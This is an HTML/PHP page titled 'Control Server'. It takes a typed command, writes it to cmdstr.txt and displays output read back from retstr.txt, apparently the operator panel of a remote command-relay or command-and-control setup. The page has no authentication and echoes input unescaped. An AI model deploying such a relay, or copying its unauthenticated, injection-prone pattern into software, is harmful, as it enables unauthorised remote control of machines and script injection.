

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Control Server</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color:  #87ceeb ;
      padding: 20px;
     
    }
    button{
		padding: 10px;
	}
	
   
  </style>
</head>
<body>
  <div id="command-form">
      <img src="serverIcon.png" alt="" width="180vw">
      
   	  <form method="post" action="controlServer.php" id="cmdform"> 
		<p>Please enter your command: </p>
		<input type="text" name="cmdstr" size="35%">
		<p><input type="submit" name="buttonExecute"  value="Execute"></p>
		
		
		<p><input type="submit" name="buttonGetResult"  value="Get Return String"></p>
	  </form> 
  </div>
	
</body>
</html>


<?php
	
	if(isset($_POST['buttonExecute'])){
		if(isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])){
			$cmdstr = $_POST['cmdstr'];
			echo 'Received: '.$cmdstr.'<br>';
			$fp =fopen('cmdstr.txt', 'w');
			fwrite($fp, $cmdstr);
			fwrite($fp, "\n");
			fclose($fp);
		}else {
			echo "commands cannot be empty<p>";
		}
	}
	elseif(isset($_POST['buttonGetResult'])){
		if(!file_exists("retstr.txt")) return;
		$f =fopen('retstr.txt', 'r');
		$retStr = fread($f, filesize("retstr.txt"));
	
		fclose($f);
		echo "<textarea rows='20' cols='60'>";
		echo $retStr;
		echo "</textarea>";
		
	}
?>